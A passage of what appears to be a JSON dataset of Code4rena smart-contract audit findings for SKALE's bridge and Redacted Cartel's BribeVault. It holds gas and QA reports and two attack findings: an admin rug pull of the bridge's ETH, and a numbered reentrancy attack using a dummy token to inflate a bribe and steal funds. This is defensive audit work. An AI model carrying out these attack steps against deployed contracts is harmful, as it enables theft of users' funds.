to be called directly in `ERC20OnChain`. Only allow minting when bridging tokens over. \n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/38"
    }
  },
  {
    "title": "Centralisation Risk: Admin Role of `TokenManagerEth` can Rug Pull All Eth from the Bridge",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/schain/TokenManagers/TokenManagerEth.sol#L45-L49\n\n\n# Vulnerability details\n\n## Impact\n\nThere is a Centralisation risk of the bridge where the `DEFAULT_ADMIN_ROLE` of `TokenManagerEth.sol` is able to modify the ERC20 token on the SChain to any arbitrary address. This would allow the admin role to change the address to one where they have infinite supply, they could then call `exitToMain(amount)` equal to the balance of the DepositBox in the main Ethereum chain. After the message is process on the main Ethereum chain they will receive the entire Eth balance of that contract.\n\nThe rug pull attack occurs because there is a `DEFAULT_ADMIN_ROLE` which is set in the intiialisation to the `msg.sender` as seen in `initializeTokenManager()` below.\n\nThe `DEFAULT_ADMIN_ROLE` may then call `setEthErc20Address(IEthErc20 newEthErc20Address)`  setting `newEthErc20Address` to any arbitrary contract they control.\n\n\n## Proof of Concept\n\n```\n    function setEthErc20Address(IEthErc20 newEthErc20Address) external override {\n        require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), \"Not authorized caller\");\n        require(ethErc20 != newEthErc20Address, \"Must be new address\");\n        ethErc20 = newEthErc20Address;\n    }\n```\n\n```\n    function initializeTokenManager(\n        string memory newSchainName,\n        IMessageProxyForSchain newMessageProxy,\n        ITokenManagerLinker newIMALinker,\n        ICommunityLocker newCommunityLocker,\n        address newDepositBox\n    )\n        public\n        virtual\n        initializer\n    {\n        require(newDepositBox != address(0), \"DepositBox address has to be set\");\n\n        AccessControlEnumerableUpgradeable.__AccessControlEnumerable_init();\n        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n        _setupRole(AUTOMATIC_DEPLOY_ROLE, msg.sender);\n        _setupRole(TOKEN_REGISTRAR_ROLE, msg.sender);\n\n        schainHash = keccak256(abi.encodePacked(newSchainName));\n        messageProxy = newMessageProxy;\n        tokenManagerLinker = newIMALinker;\n        communityLocker = newCommunityLocker;        \n        depositBox = newDepositBox;\n\n        emit DepositBoxWasChanged(address(0), newDepositBox);\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider removing the function `setEthErc20Address()` as `ethErc20` is set in the `initialize()` function and does not need to be changed.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/35"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. There are `require` messages bigger than 32 bytes. More than 32 bytes for message will incur an extra gas costs.\n\n- [Twin.sol#L66](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Twin.sol#L66)\n- [MessageProxy.sol#L489](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L489)\n- [DepositBoxEth.sol#L102](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L102)\n- [DepositBoxERC721.sol#L107](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L107)\n\n[MessageProxyForMainnet.sol](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol)\n- [152](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L152)\n- [169-171](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L169-L171)\n- [189-191](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L189-L191)\n- [217](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L217)\n- [222](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L222)\n- [320](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L320)\n- [331](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L331)\n\n[Messages.sol](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol):\n- [L270](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L270)\n- [L283](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L283)\n- [L321](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L321)\n- [L351](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L351)\n- [L386](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L386)\n- [L438](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L438)\n- [L469](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L469)\n- [L506](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L506)\n- [L540](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L540)\n- [L578](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/Messages.sol#L578)\n\n2. Change the incremental logic from `i++` to `++i` in order to save some opcodes:\n- [MessageProxy.sol#L221](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L221)\n- [MessageProxy.sol#L515](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L515)\n- [Linker.sol#L100](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L100)\n- [Linker.sol#L149](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149)\n- [Linker.sol#L175](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L175)\n- [DepositBoxERC1155.sol#L79](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79)\n- [DepositBoxERC1155.sol#L275](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L275)\n- [DepositBoxERC1155.sol#L398](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L398)\n- [DepositBoxERC1155.sol#L444](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L444)\n- [DepositBoxERC1155.sol#L459](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L459)\n- [DepositBoxERC20.sol#L76](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76)\n- [DepositBoxERC20.sol#L276](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L276)\n- [DepositBoxERC721.sol#L76](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L76)\n- [DepositBoxERC721.sol#L260](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L260)\n- [MessageProxyForMainnet.sol#L118](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118)\n- [MessageProxyForMainnet.sol#L235](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235)\n- [MessageProxyForSchain.sol#L118](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/MessageProxyForSchain.sol#L118)\n- [MessageProxyForSchain.sol#L222](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/MessageProxyForSchain.sol#L222)\n- [TokenManagerLinker.sol#L122](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagerLinker.sol#L122)\n- [TokenManagerLinker.sol#L151](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagerLinker.sol#L151)\n- [TokenManagerLinker.sol#L166](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagerLinker.sol#L166)\n- [TokenManagerLinker.sol#L178](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagerLinker.sol#L178)\n- [TokenManagerLinker.sol#L192](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagerLinker.sol#L192)\n- [TokenManagerERC1155.sol#L500](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC1155.sol#L500)\n- [TokenManagerERC1155.sol#L514](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC1155.sol#L514)\n\n3. It's possible to avoid storage access a save gas using `immutable` keyword for the following variables:\n- `erc721ContractOnSchain` and `receiverContractOnMainnet` in [ERC721ReferenceMintAndMetadataSchain.sol#L34-L35](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataSchain.sol#L34-L35)\n- `erc721ContractOnMainnet`, `schainName` and `owner` in [ERC721ReferenceMintAndMetadataMainnet.sol#L34-L38](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataMainnet.sol#L34-L38)\n\n4. The `returns` is not used and could be removed in:\n- [ERC721ReferenceMintAndMetadataMainnet.sol#L85](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataMainnet.sol#L85)\n\n5. Change these methods to inline\n- `_saveTransferredAmount` and `_removeTransferredAmount` in [DepositBoxEth.sol#L231-L238](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L231-L238)\n\n6. Cache the constant value `keccak256(xxxxxxxxxxxx)` as a constant \n- [DepositBox.sol#L65](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L65)\n- [DepositBox.sol#L78](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L78)\n- [TokenManagerERC1155.sol#L267](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC1155.sol#L267)\n- [TokenManagerERC1155.sol#L283](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC1155.sol#L283)\n\n7. Use delete instead of set to default value (`false` or `0`)\n- [DepositBox.sol#L89](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L89)\n- [CommunityPool.sol#L178](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L178)\n- [DepositBoxEth.sol#L124](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L124)\n- [DepositBoxEth.sol#L188](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L188)\n- [DepositBoxERC721.sol#L291](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L291)\n- [TokenManager.sol#L173](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManager.sol#L173)\n- [TokenManagerERC721.sol#L302](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC721.sol#L302)\n\n8. `allowance` not needed. The `transferFrom` already check the expected amount.\n- [DepositBoxERC20.sol#L108-L111](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L108-L111)\n- [TokenManagerERC20.sol#L282](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L282)\n\n9. The `data` variable is assigned, but in the case of `isMainChainToken=true`, the previous content will be discarded and the calculation could be saved if done inside the `else` block\n- [TokenManagerERC1155.sol#L473](https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC1155.sol#L473)",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/30"
    }
  },
  {
    "title": "Reentrancy in `depositBribeERC20` function",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L164-L205\n\n\n# Vulnerability details\n\n## Impact\n\n`depositBribeERC20` function in `BriveVault` is reentrant in line 187, where an address supplied by the caller is called.\n\nA bad actor that has `DEPOSITOR_ROLE` and is a contract can execute a folowing attack:\n\n1. Create a dummy token contract, reentrant in the transferFrom() function. All tokens are approved to the `BriveVault` and the attacker contract has unlimited tokens. Reentrancy aims back to a function in the attacker contract, which calls `depositBribeERC20` again.\n2. The first call by the contract must use a novel `bribeIdentifier`. `token` is set to a dummy contract and `amount` to `uint(-2)`.\n3. All checks pass, `transferFrom` is called, which calls attacker contract, which can call `depositBribeERC20` again, this time will transfer 1 wei of a valuable token, using the same `bribeIdentifier`. All checks pass as the previous token hasn't been registered yet. Then, a valid transfer happens. After that, the amount is set to 1 wei and the token is saved. Event is emitted and the function returns value. Then, attacker function returns and dummy token returns. The operation is to increment amount in storage by the transfer value, which increases `b.amount` to the maximum integer. The token is nonzero, so the if statement is passed.\n\nThus, an attacker can grant any amount of tokens from `BriveVault` to a certain bribe, stealing all the funds once the bribe will be withdrawn.\n\n## Recommended Mitigation Steps\n\nSet bribe token before the transfer is made.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/122"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "* Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met, e.g.:\n```solidity\n  \"Distributions, amounts, and fees must contain the same # of elements\"\n  require(amount > 0, \"Bribe amount must be greater than 0\");\n```\n\n* Declaring a named return but not using it and directly returning instead costs more gas:\n```solidity\n  returns (bool upkeepNeeded)\n  {\n    if (IBTRFLY(BTRFLY).balanceOf(address(this)) > 0) {\n        return true;\n  }\n```\n\n* Evaluated ethCap > ethAmount twice, should cache and re-use the result:\n```solidity\n  uint256 ethLiquidity = ethCap > ethAmount ? ethAmount : ethCap;\n  ...\n  uint256 btrflyLiquidity = ethCap > ethAmount\n```\n\n* Would be cheapier if you use _bribeVault when emitting the event:\n```solidity\n  bribeVault = _bribeVault;\n  emit SetBribeVault(bribeVault);\n```\n\n* Cache repeated storage access to a local variable to reduce gas costs, e.g.:\nbribeVault in function depositBribe is accessed 4 times.\nfeeRecipient and distributor in function transferBribes are accessed multiple times in a for a loop.\n\n* When depositing both TokemakBribe and BribeVault check that token is not zero address and amount greater than zero. If these contracts will always be used together, then only one of them can perform these validations to save some gas.\n\n* ++ would be a bit cheaper than += 1 :\n```solidity\n  reward.updateCount += 1;\n  for (uint256 i = 0; i < proposals.length; i += 1)\n```\nAlso, some suggest even optimizing the loops by removing a default initialization to 0 and using prefix increments, e.g.:\n```solidity\n  for (uint256 i; i < proposals.length; ++i)\n```\n\n* function setProposals iterates over all the proposals and calls setProposal. I wonder if you really need to emit a separate SetProposals event after all because SetProposal event will be emitted inside the setProposal for the same proposals anyway.\n\n* Repeated calculation of values that do not change should be cached, e.g. 2**256 - 1 is re-calculated twice:\n```solidity\n    IERC20(_BTRFLY).approve(_CURVEPOOL, 2**256 - 1);\n    IERC20(_WETH).approve(_CURVEPOOL, 2**256 - 1);\n```\n\n* Also, 10^18, and 10^_ethDecimals, and 10^_btrflyDecimals do not change, so should be extracted to constants to reduce gas usage:\n```solidity\n        if (isBTRFLY) {\n            return (((amount * priceOracle) / (10**18)) * (10**_ethDecimals)) /\n                (10**_btrflyDecimals);\n        }\n\n        return\n            (((amount * (10**18)) / priceOracle) *\n                (10**_btrflyDecimals)) / (10**_ethDecimals);\n```",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/116"
    }
  },
  {
    "title": "QA Report",
    "body": "* function getBribe does not verify that bribeIdentifier exists and returns default empty values in such case.\n\n* receive() does not verify that the sender is actually a bribeVault:\n```solidity\n  // Enables BribeVault to transfer native tokens\n  receive() external payable {}\n```\n\n* You can use type(uint256).max here:\n```solidity\n   2**256 - 1\n```\n\n* Misleading comment:\n```solidity\n  /**\n      @notice Set a new voting round\n   */\n  function getRound() external view returns (uint256)\n```\n\n* Either the comment or the condition is misleading to cover the case when deadline = block.timestamp:\n```solidity\n  require(deadline >= block.timestamp, \"Deadline must be in the future\");\n```\n\n* Names like ethAmount or ethLiquidity are a bit misleading because they actually mean weth, not eth.\n\n* rewardForwarding can be set but is not used in any meaningful way. Leaving this as a note, because I am not sure what were the intentions, maybe an external contract consumes this information.\n\n* Function setProposal does not check if this proposal already exists, so the same proposal can be set again with a different deadline, but I am not sure if this is intended or not.\n\n* The comment says it can withdraw only arbitrary tokens but it actually has no restrictions. I think it should forbid withdrawing BTRFLY and WETH tokens.\n```solidity\n    // Withdraw arbitrary token and amount owned by the contract\n    function withdraw\n```\n\n* I think round numbers can only increase so setRound should validate that _newRound > _round:\n```solidity\n    /**\n        @notice Set a new voting round\n        @param  _newRound uint256 The new round number\n     */\n    function setRound(uint256 _newRound) external onlyAuthorized {\n        _round = _newRound;\n    }\n```\n\n* Consider adding safe launch extra precautions, so you can act and reduce the impact of the vulnerability in case of an unexpected. A few examples:\n1) Make contracts Pausable\n2) Temporal upper limits for deposits, e.g. by proposal / by address / by token, etc.\n3) Timelock for important governance actions.\n\n* depositBribeERC20 does not validate how many tokens were actually transferred:\n```solidity\n    IERC20(token).safeTransferFrom(briber, address(this), amount);\n    b.amount += amount; // Allow bribers to increase bribe\n```\nThis means that tokens with on transfer fees will break the calculations. Because the protocol supports any ERC20 token (no whitelist or something like that), consider validating balance before/after to account for how many tokens were actually transferred.\n\n* function performUpkeep() could assert that btrflyLiquidity <= btrfly for extra protection that oracle price and calculations did not cause an inflated result.\n\n* Sufficient amounts doesn't sound right here:\n```solidity\n    // Only complete upkeep only on sufficient amounts\n    require(ethLiquidity > 0 && btrflyLiquidity > 0, \"Insufficient amounts\");\n```\nI think a better but more expensive validation would be to check:\n```solidity\n    require(IERC20(WETH).balanceOf(address(this)) >= ethLiquidity && IBTRFLY(BTRFLY).balanceOf(address(this)) >= btrflyLiquidity, \"Insufficient amounts\");\n```\n\n* function addLiquidity (or performUpkeep) trusts the curve pool and does not verify that it actually received at least minAmount of LP token. I think it should independently check balance before/after to make sure that enough tokens were received to prevent situations like this: https://hackmd.io/@poolpitako/SkwTLn8Jq \n\n* function performUpkeep at the end burns all the BTRFLY tokens that the contract holds:\n```solidity\n    uint256 unusedBTRFLY = IBTRFLY(BTRFLY).balanceOf(address(this));\n\n    if (unusedBTRFLY > 0) {\n        IBTRFLY(BTRFLY).burn(unusedBTRFLY);\n    }\n```\nI am not sure about the exact intentions here, but one problem with this, is when the treasury does not have enough WETH, it will use only a small amount of BTRFLY (ethCap is low, but btrfly balance is relatively high), and all the remaining BTRFLY tokens will be burnt. I am not sure if this is actually a problem or a feature, so just submitting FYI.\n\n* Slippage is applied on the expected amount:\n```solidity\n  uint256 expectedAmount = ICurveCryptoPool(CURVEPOOL).calc_token_amount(\n      amounts\n  );\n  uint256 minAmount = expectedAmount - ((expectedAmount * slippage) / 1000);\n  ICurveCryptoPool(CURVEPOOL).add_liquidity(amounts, minAmount);\n```\nFrom curve's documentation:\n\n_This calculation accounts for slippage, but not fees. It should be used as a basis for determining expected\namounts when calling add_liquidity or remove_liquidity_imbalance, but should not be considered to be precise!_\n\nSo even if this calculation was not precise, I expect the discrepancies would not be very big. The problem is that the slippage protection is applied to the expectedAmount which is fetched on the go, so it doesn't give much leverage for the caller. If the calc_token_amount can be manipulated, then minAmount slippage protection will make no sense, because it will execute the add_liquidity on this new manipulated calc_token_amount.\n\n* functions depositBribeERC20 and transferBribes do not follow Check-Effects-Interactions pattern so it should have re-entrancy protection unless you 100% trust all the external calls.\n\n* Consider consistently using safeTransfer to move tokens, e.g.:\n```solidity\n    IERC20(token).transfer(feeRecipient, feeAmount);\n    IERC20(token).transfer(distributor, distributorAmount);\n```\n\n* RewardDistributor claim functions uses good old transfer to send native asset:\n```solidity\n  payable(_account).transfer(_amount);\n```\nIt is no longer recommended as recipients with custom fallback functions (smart contracts) will not be able to handle that. You can read more here: https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\n",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/115"
    }
  },
  {
    "title": "QA Report",
    "body": "Low : \nTitle : proposal can be frontrun to support malicious token\n\nImpact : When an authorized user set a proposal, a malicious user might call depositBribeERC20() right after the set proposal transaction is finish, since the token is not whitelisted, the malicious user might provide a malicious token, a token that will revert on all interaction with this contract, this can cause a dos on the proposal that just being set.\n\nPOC : https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/TokemakBribe.sol#L125",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/111"
    }
  },
  {
    "title": "QA Report",
    "body": "## Redacted Cartel QA Report\n\nUnless otherwise noted, manual auditing and testing were done using Visual Studio Code and Remix.\nThe audit was done from February 15-17, 2022 by ye0lde through code4rena.\n\nOverall, I found the code to be clear to follow and understand. A test suite was provided. Including more tests that tackle edge scenarios and providing coverage and gas reports by default would be useful.\n\n- [Findings](#findings)\n  - [L-1 - Restrict funds receivable to be only from `BribeVault` (RewardDistributor.sol)](#l-1---restrict-funds-receivable-to-be-only-from-bribevault-rewarddistributorsol)\n  - [L-2 - Unchecked ERC20 transfer calls](#l-2---unchecked-erc20-transfer-calls)\n  - [NC-1 - Incorrect return value description for `getBribe` (TokemakBribe.sol)](#nc-1---incorrect-return-value-description-for-getbribe-tokemakbribesol)\n\n## Findings  \n\n### L-1 - Restrict funds receivable to be only from `BribeVault` (RewardDistributor.sol)\n\n#### Impact\nNative fund transfers into the `RewardDistributor` contract are only expected from the `BribeVault` contract. It would be good to restrict incoming fund transfers to prevent accidental native fund transfers from other sources.\n\n#### Proof of Concept\nThe `receive` function is here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/RewardDistributor.sol#L58-L59\n\n```\n// Enables BribeVault to transfer native tokens\nreceive() external payable {}\n```\n\n#### Recommended Mitigation Steps\nModify the receive() function to only accept transfers from the `BribeVault` contract.\n\n```\nreceive() external payable {  \n    require(msg.sender == address(bribeVault), \"Not BribeVault...\");\n}\n```\n---\n\n### L-2 - Unchecked ERC20 transfer calls \n\n#### Impact\nERC20 transfer and transferFrom calls normally return true on a successful transfer.  If transfers are done with ERC20 token which does not comply with the EIP-20 standard it might return false on a failed transaction rather than revert. In this case, it would count as a valid transaction even though it is not. \n\n#### Proof of Concept\nUnchecked transfer calls are here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L296-L297\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L337\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L146\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L164\n\n#### Recommended Mitigation Steps\nConsider using OpenZeppelin's library with safe versions of transfer functions as used in other areas of the code.\n\n---\n\n### NC-1 - Incorrect return value description for `getBribe` (TokemakBribe.sol)\n\n#### Impact\nCode clarity\n\n#### Proof of Concept\nThe incorrect comment which appears to be copied from line #192 is here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L193\n\n#### Recommended Mitigation Steps\nCorrect the comment/description.\n\n---",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/103"
    }
  },
  {
    "title": "QA Report",
    "body": "## Summary:\nDuring the code assessment, we found multiple issues related to unchecked transfer and no handing of return values. Many functions call like \"transfer,\" \"deposit,\" \"approve,\" etc., returns some value after the function call. Handling these calls is important to prevent unexpected outcomes. Apart from that, we found multiple functions which were missing zero address checks. It is advised to add a zero address check at all possible functions setting an address. In solidity, any error caused to set the value to default, and for an address variable, the default value is zero address. Hence any fund or privilege gets pointed to zero address, it will be unrecoverable. \nThe contract was found to be using floating pragma, which allows the contract to be compiled to multiple versions and hence can cause inconsistencies or errors on different versions. We also noticed the uses of large number literals. Although it is not a security issue but enhances readability and reduces the chance of errors or missing digits. We also noticed missing events in many critical functions. Events are important for logging purposes. Hence it is recommended to add events and indexed events at all possible function calls for better logging. Lastly, we also noticed that the fee value, which is set by an admin, can be set to zero due lack of proper input validation. \n\n\n## Low Severity findings:\n\n## QA - 1\n\n### Title: \nUnchecked return value in transfer\n\n### Description:\nThe return value of the token transfers is not checked or validated at all in the functions shown below. This may lead to issues if there's a critical contract logic happening below the transfer that affects or manipulates the number of ether or tokens.\nTherefore, if the return value is not checked, the adversaries will be able to call those functions without actually transferring any ether and manipulating the token balance.\n\n### PoC:\nTransfer:\nGo to the below lines of code and we will notice that transfer 